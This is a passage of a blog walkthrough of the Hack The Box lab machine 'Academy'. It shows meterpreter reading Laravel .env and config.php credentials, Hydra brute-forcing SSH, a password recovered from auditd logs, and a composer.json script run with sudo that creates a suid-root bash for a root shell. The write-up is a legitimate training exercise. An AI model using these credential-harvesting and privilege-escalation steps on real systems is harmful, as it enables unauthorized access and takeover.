+<span class="go">100644/rw-r--r--  1040     fil   2020-08-09 15:49:40 +0000  phpunit.xml</span>
+<span class="go">40755/rwxr-xr-x   4096     dir   2021-01-13 17:21:07 +0000  public</span>
+<span class="go">100644/rw-r--r--  3622     fil   2020-08-09 15:49:40 +0000  readme.md</span>
+<span class="go">40755/rwxr-xr-x   4096     dir   2020-08-09 15:49:40 +0000  resources</span>
+<span class="go">40755/rwxr-xr-x   4096     dir   2020-08-09 15:49:40 +0000  routes</span>
+<span class="go">100644/rw-r--r--  563      fil   2020-08-09 15:49:40 +0000  server.php</span>
+<span class="go">40755/rwxr-xr-x   4096     dir   2020-08-09 15:49:40 +0000  storage</span>
+<span class="go">40755/rwxr-xr-x   4096     dir   2020-08-09 15:49:40 +0000  tests</span>
+<span class="go">40755/rwxr-xr-x   4096     dir   2020-08-09 15:49:40 +0000  vendor</span>
+<span class="go">100644/rw-r--r--  549      fil   2020-08-09 15:49:40 +0000  webpack.mix.js</span>
+<span class="go">meterpreter &gt; cat .env</span>
+<span class="go">APP_NAME=Laravel</span>
+<span class="go">APP_ENV=local</span>
+<span class="go">APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span>
+<span class="go">APP_DEBUG=false</span>
+<span class="go">APP_URL=http://localhost</span>
+
+<span class="go">LOG_CHANNEL=stack</span>
+
+<span class="go">DB_CONNECTION=mysql</span>
+<span class="go">DB_HOST=127.0.0.1</span>
+<span class="go">DB_PORT=3306</span>
+<span class="go">DB_DATABASE=academy</span>
+<span class="go">DB_USERNAME=dev</span>
+<span class="go">DB_PASSWORD=mySup3rP4s5w0rd!!</span>
+
+<span class="go">BROADCAST_DRIVER=log</span>
+<span class="go">CACHE_DRIVER=file</span>
+<span class="go">SESSION_DRIVER=file</span>
+<span class="go">SESSION_LIFETIME=120</span>
+<span class="go">QUEUE_DRIVER=sync</span>
+
+<span class="go">REDIS_HOST=127.0.0.1</span>
+<span class="go">REDIS_PASSWORD=null</span>
+<span class="go">REDIS_PORT=6379</span>
+
+<span class="go">MAIL_DRIVER=smtp</span>
+<span class="go">MAIL_HOST=smtp.mailtrap.io</span>
+<span class="go">MAIL_PORT=2525</span>
+<span class="go">MAIL_USERNAME=null</span>
+<span class="go">MAIL_PASSWORD=null</span>
+<span class="go">MAIL_ENCRYPTION=null</span>
+
+<span class="go">PUSHER_APP_ID=</span>
+<span class="go">PUSHER_APP_KEY=</span>
+<span class="go">PUSHER_APP_SECRET=</span>
+<span class="go">PUSHER_APP_CLUSTER=mt1</span>
+
+<span class="go">MIX_PUSHER_APP_KEY=&quot;${PUSHER_APP_KEY}&quot;</span>
+<span class="go">MIX_PUSHER_APP_CLUSTER=&quot;${PUSHER_APP_CLUSTER}&quot;</span>
+</code></pre></div>
+<p>That's a new password: <code>mySup3rP4s5w0rd!!</code>. Also, when we did our <code>gobuster dir</code> of the main
+<code>academy.htb</code> website, we saw the file <code>config.php</code>. We should go see what is in that as well:</p>
+<div class="highlight"><pre><span></span><code><span class="go">meterpreter &gt; cd public</span>
+<span class="go">meterpreter &gt; ls</span>
+<span class="go">Listing: /var/www/html/academy/public</span>
+<span class="go">=====================================</span>
+
+<span class="go">Mode              Size   Type  Last modified              Name</span>
+<span class="go">----              ----   ----  -------------              ----</span>
+<span class="go">40755/rwxr-xr-x   4096   dir   2020-11-05 12:23:01 +0000  Modules_files</span>
+<span class="go">100644/rw-r--r--  1600   fil   2020-08-11 00:55:16 +0000  admin-page.php</span>
+<span class="go">100644/rw-r--r--  3247   fil   2020-08-12 21:28:32 +0000  admin.php</span>
+<span class="go">100644/rw-r--r--  174    fil   2020-08-09 16:55:09 +0000  config.php</span>
+<span class="go">100644/rw-r--r--  55036  fil   2020-11-09 10:13:59 +0000  home.php</span>
+<span class="go">40755/rwxr-xr-x   4096   dir   2020-09-14 22:38:21 +0000  images</span>
+<span class="go">100644/rw-r--r--  2117   fil   2020-09-14 22:40:07 +0000  index.php</span>
+<span class="go">100644/rw-r--r--  3185   fil   2020-08-12 21:28:52 +0000  login.php</span>
+<span class="go">100644/rw-r--r--  4304   fil   2020-11-05 12:51:00 +0000  register.php</span>
+<span class="go">100644/rw-r--r--  5494   fil   2021-01-13 17:21:07 +0000  shell.php</span>
+<span class="go">100644/rw-r--r--  685    fil   2020-11-05 12:51:19 +0000  success-page.php</span>
+
+<span class="go">meterpreter &gt; cat config.php</span>
+<span class="go">&lt;?php</span>
+<span class="go">ini_set(&#39;display_errors&#39;, 1);</span>
+<span class="go">ini_set(&#39;display_startup_errors&#39;, 1);</span>
+<span class="go">error_reporting(E_ALL);</span>
+<span class="gp">$</span><span class="nv">link</span><span class="o">=</span>mysqli_connect<span class="o">(</span><span class="s1">&#39;localhost&#39;</span>,<span class="s1">&#39;root&#39;</span>,<span class="s1">&#39;GkEWXn4h34g8qx9fZ1&#39;</span>,<span class="s1">&#39;academy&#39;</span><span class="o">)</span><span class="p">;</span>
+<span class="go">?&gt;</span>
+</code></pre></div>
+<p>Another possible password: <code>GkEWXn4h34g8qx9fZ1</code>.</p>
+<h2 id="user">User<a class="headerlink" href="#user" title="Permanent link">#</a></h2>
+<p>It's a well-used adage in Security that people are lazy. If they can get away with it, they'll
+re-use passwords <strong>EVERYWHERE</strong>. Now that we have a few usernames and some possible passwords,
+we should try using a tool to brute-force combinations and see if we get any hits. My personal
+favorite for testing passwords against an SSH server is <a href="https://github.com/vanhauser-thc/thc-hydra"><code>THC Hydra</code></a>. We create a list of users:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">jra@kali:~/htb/Machines/Academy$ </span>cat users.txt
+<span class="go">egre55</span>
+<span class="go">mrb3n</span>
+<span class="go">cry0l1t3</span>
+<span class="go">root</span>
+<span class="go">21y4d</span>
+<span class="go">ch4p</span>
+<span class="go">g0blin</span>
+</code></pre></div>
+<p>And passwords:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">jra@kali:~/htb/Machines/Academy$ </span>cat passwords.txt
+<span class="go">mySup3rP4s5w0rd!!</span>
+<span class="go">secret</span>
+<span class="go">GkEWXn4h34g8qx9fZ1</span>
+</code></pre></div>
+<p>We can feed these files to <code>hydra</code> to check for hits. A couple of comments on the flags to <code>hydra</code>: <code>-t 4</code> sets the number of concurrent threads to be <code>4</code>. Some services will throttle or ban too
+many attempts at a time. The <code>-e</code> flag adds some additional checks:</p>
+<blockquote>
+<p>s - try the login as password<br>
+n - try an empty password<br>
+r - reverse the login and try it as password<br></p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><span class="gp">jra@kali:~/htb/Machines/Academy$ </span>hydra -L users.txt -P passwords.txt -t <span class="m">4</span> -e snr ssh://academy.htb
+<span class="go">Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span>
+
+<span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-13 20:15:02</span>
+<span class="go">[DATA] max 4 tasks per 1 server, overall 4 tasks, 42 login tries (l:7/p:6), ~11 tries per task</span>
+<span class="go">[DATA] attacking ssh://academy.htb:22/</span>
+<span class="go">[22][ssh] host: academy.htb   login: cry0l1t3   password: mySup3rP4s5w0rd!!</span>
+<span class="go">1 of 1 target successfully completed, 1 valid password found</span>
+<span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-13 20:15:33</span>
+</code></pre></div>
+<p>We can log in to <code>academy</code> as <code>cry0l1t3</code> and get the <strong>User</strong> flag:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">jra@kali:~/htb/Machines/Academy$ </span>ssh cry0l1t3@academy.htb
+<span class="go">cry0l1t3@academy.htb&#39;s password:</span>
+<span class="go">Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)</span>
+
+<span class="go"> * Documentation:  https://help.ubuntu.com</span>
+<span class="go"> * Management:     https://landscape.canonical.com</span>
+<span class="go"> * Support:        https://ubuntu.com/advantage</span>
+
+<span class="go"> System information disabled due to load higher than 2.0</span>
+
+
+<span class="go">0 updates can be installed immediately.</span>
+<span class="go">0 of these updates are security updates.</span>
+
+<span class="go">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span>
+
+
+<span class="go">Last login: Wed Jan 13 19:29:30 2021 from 10.10.14.106</span>
+<span class="gp">$ </span>ls
+<span class="go">user.txt</span>
+<span class="gp">$ </span>cat user.txt
+<span class="go">569bd4717e889c4ba19266c3790ac81e</span>
+</code></pre></div>
+<p>(Your flag may be different, as the flags change over time)</p>
+<h2 id="root">Root<a class="headerlink" href="#root" title="Permanent link">#</a></h2>
+<p>Now we have a shell as a regular user on the box. We can try a couple of obvious paths to
+root:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">$ </span>sudo -l
+<span class="go">[sudo] password for cry0l1t3:</span>
+<span class="go">Sorry, user cry0l1t3 may not run sudo on academy.</span>
+<span class="gp">$ </span>su -
+<span class="go">Password:</span>
+<span class="go">su: Authentication failure</span>
+<span class="gp">$ </span>cat /root/root.txt
+<span class="go">cat: /root/root.txt: Permission denied</span>
+</code></pre></div>
+<p>But we get bupkis. Uploading and running <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">linPEAS</a> does give us something interesting to take a look at:</p>
+<p><img alt="cry0l1t3 is in group adm" src="../../img/Academy/18.png" /></p>
+<p>We're a member of group <code>adm</code>, which isn't a common thing for normal users. Members of the 'adm' 
+group have read access into the logs in <code>/var/log</code>. From the <code>linPEAS</code> output, we see that there
+are some files in <code>/var/log</code> that look like they might contain interesting information:</p>
+<p><img alt="/var/log/audit?" src="../../img/Academy/19.png" /></p>
+<p>These are output from <a href="https://linux.die.net/man/8/auditd">auditd</a>, an overview of which is
+linked <a href="https://www.digitalocean.com/community/tutorials/how-to-use-the-linux-auditing-system-on-centos-7">here</a>. From the <code>auditd</code> man page:</p>
+<blockquote>
+<p><code>auditd</code> is the userspace component to the Linux Auditing System. It's responsible for writing audit records to the disk. Viewing the logs is done with the <code>ausearch</code> or <code>aureport</code> utilities.</p>
+</blockquote>
+<p>Using the <code>ausearch</code> tool, we can dump the audit logs and search for interesting things. I found 
+it easiest to run <code>ausearch -i -if /path/to/audit/file</code> and then use <code>grep</code> to look for interesting
+things. <code>-i</code> tells <code>ausearch</code> to 'interpret' the data in the logs, such as converting numeric UIDs
+to usernames. <code>-if /path/name</code> specifies the path of file to read. Starting at the oldest file
+and working forwards, running <code>ausearch -i -if /var/log/audit/audit.log.3 | grep cry0l1t3 | less</code>, 
+we can find an interesting set of lines:</p>
+<div class="highlight"><pre><span></span><code>type=TTY msg=audit(08/12/2020 02:28:10.086:83) : tty pid=2517 uid=cry0l1t3 auid=root ses=1 major=4 minor=1 comm=sh data=&quot;su mrb3n&quot;,&lt;nl&gt;
+type=TTY msg=audit(08/12/2020 02:28:13.906:84) : tty pid=2520 uid=cry0l1t3 auid=root ses=1 major=4 minor=1 comm=su data=&quot;mrb3n_Ac@d3my!&quot;,&lt;nl&gt;
+</code></pre></div>
+<p>Verifying the password works, we now have a shell as <code>mrb3n</code>, and <code>mrb3n</code> can run the command
+<code>/usr/bin/composer</code> as <code>root</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">cry0l1t3@academy:~$ </span>su - mrb3n
+<span class="go">Password: </span>
+<span class="gp">$ </span>id
+<span class="go">uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n)</span>
+<span class="gp">$ </span>sudo -l
+<span class="go">[sudo] password for mrb3n: </span>
+<span class="go">Matching Defaults entries for mrb3n on academy:</span>
+<span class="go">    env_reset, mail_badpass,</span>
+<span class="go">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+
+<span class="go">User mrb3n may run the following commands on academy:</span>
+<span class="go">    (ALL) /usr/bin/composer</span>
+</code></pre></div>
+<p><a href="https://getcomposer.org/">Composer</a> is a dependency manager for PHP modules. In-depth
+documentation is available on the Composer website. Composer is controlled via a
+config file named <code>composer.json</code>, and the feature we're interested in is the ability
+to define arbitrary <a href="https://getcomposer.org/doc/articles/scripts.md">scripts</a> that
+can be excuted from the <code>composer</code> command line. We can get very complex with our
+scripts, or go simple. This <code>composer.json</code> creates a suid-root copy of <code>/bin/bash</code>
+in the directory <code>/tmp/.pug</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+    <span class="nt">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;pugpug/pugpug&quot;</span><span class="p">,</span>
+    <span class="nt">&quot;description&quot;</span><span class="p">:</span> <span class="s2">&quot;Pugpug Hacks.&quot;</span><span class="p">,</span>
+    <span class="nt">&quot;license&quot;</span><span class="p">:</span> <span class="s2">&quot;MIT&quot;</span><span class="p">,</span>
+    <span class="nt">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;project&quot;</span><span class="p">,</span>
+    <span class="nt">&quot;scripts&quot;</span><span class="p">:</span> <span class="p">{</span>
+        <span class="nt">&quot;pugpug&quot;</span><span class="p">:</span> <span class="p">[</span>
+            <span class="s2">&quot;mkdir -p /tmp/.pug ; cp /bin/bash /tmp/.pug/bash ; chmod 4755 /tmp/.pug/bash&quot;</span>
+        <span class="p">]</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Running <code>sudo composer run-script pugpug</code> will execute the script as <code>root</code>, and we're left
+with a suid-root copy of <code>bash</code> in <code>/tmp/.pug</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">mrb3n@academy:/tmp/.pug$ </span>cat composer.json
+<span class="go">{</span>
+<span class="go">    &quot;name&quot;: &quot;pugpug/pugpug&quot;,</span>
+<span class="go">    &quot;description&quot;: &quot;Pugpug Hacks.&quot;,</span>
+<span class="go">    &quot;license&quot;: &quot;MIT&quot;,</span>
+<span class="go">    &quot;type&quot;: &quot;project&quot;,</span>
+<span class="go">    &quot;scripts&quot;: {</span>
+<span class="go">        &quot;pugpug&quot;: [</span>
+<span class="go">            &quot;mkdir -p /tmp/.pug ; cp /bin/bash /tmp/.pug/bash ; chmod 4755 /tmp/.pug/bash&quot;</span>
+<span class="go">        ]</span>
+<span class="go">    }</span>
+<span class="go">}</span>
+<span class="gp">mrb3n@academy:/tmp/.pug$ </span>sudo composer run-script pugpug
+<span class="go">[sudo] password for mrb3n:</span>
+<span class="go">PHP Warning:  PHP Startup: Unable to load dynamic library &#39;mysqli.so&#39; (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span>
+<span class="go">PHP Warning:  PHP Startup: Unable to load dynamic library &#39;pdo_mysql.so&#39; (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span>
+<span class="go">Do not run Composer as root/super user! See https://getcomposer.org/root for details</span>
+<span class="go">&gt; mkdir -p /tmp/.pug ; cp /bin/bash /tmp/.pug/bash ; chmod 4755 /tmp/.pug/bash</span>
+<span class="gp">mrb3n@academy:/tmp/.pug$ </span>ls -l
+<span class="go">total 1160</span>
+<span class="go">-rwsr-xr-x 1 root  root  1183448 Jan 14 00:01 bash</span>
+<span class="go">-rw-r--r-- 1 mrb3n mrb3n     258 Jan 14 00:00 composer.json</span>
+</code></pre></div>
+<p>(Note the warning about not running Composer as root)</p>
+<p>We can run our malicious copy of <code>bash</code> with <code>/tmp/.pug/bash -p</code>, and get a root shell:</p>
+<div class="highlight"><pre><span></span><code><span class="gp">mrb3n@academy:/tmp/.pug$ </span>/tmp/.pug/bash -p
+<span class="go">bash-5.0# id</span>
+<span class="go">uid=1001(mrb3n) gid=1001(mrb3n) euid=0(root) groups=1001(mrb3n)</span>
+<span class="go">bash-5.0# cat /root/root.txt</span>
+<span class="go">00d08ac7120264dfc58d360503211699</span>
+</code></pre></div>
+<p>And that's the <strong>Root</strong> flag.</p>
+<h2 id="final-thoughts">Final thoughts<a class="headerlink" href="#final-thoughts" title="Permanent link">#</a></h2>
+<p>This was a fun box. I'm always impressed with egre55's machines, they're well developed and have
+plausible holes and exploits. I can see how in the 'real world' these types of configurations are
+possible, and how unintended side-effects can lead to greater compromise.</p>
+<p><em>-- pugpug</em></p>
+
+              
+            </article>
+          </div>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="Footer">
+      
+        
+        <a href="../.." class="md-footer__link md-footer__link--prev" aria-label="Previous: Welcome" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              Welcome
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../Forge/" class="md-footer__link md-footer__link--next" aria-label="Next: Forge" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              Forge
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Joe Ammond - <a href="https://twitter.com/joeammond">@joeammond</a>
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/joeammond" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/joeammond/" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+    </a>
+  
+    
+    
+      
+      
+    
+    <a href="https://github.com/joeammond" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "translations": {"clipboard.copy": "Copy to clipboard", "clipboard.copied": "Copied to clipboard", "search.config.lang": "en", "search.config.pipeline": "trimmer, stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.placeholder": "Type to start searching", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing", "select.version.title": "Select version"}, "search": "../../assets/javascripts/workers/search.361d90f1.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.289a2a4b.min.js"></script>
+      
+    
+  </body>
+</html>
